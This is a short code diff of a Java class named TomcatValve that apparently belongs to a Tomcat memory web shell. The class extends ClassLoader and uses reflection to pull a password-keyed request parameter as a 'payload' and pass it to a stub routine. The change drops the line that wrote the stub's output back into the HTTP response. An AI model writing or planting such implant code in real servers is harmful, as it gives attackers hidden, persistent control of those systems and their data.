@@ -12,10 +12,7 @@ public class TomcatValve extends ClassLoader implements InvocationHandler {{
         String payload = (String) invokeMethod(
             request, "getParameter", password
         );
-        invokeMethod(
-            invokeMethod(response, "getWriter"),
-                "write", stub(payload, request, response)
-        );
+        stub(payload, request, response);
     }}
 
     @Override
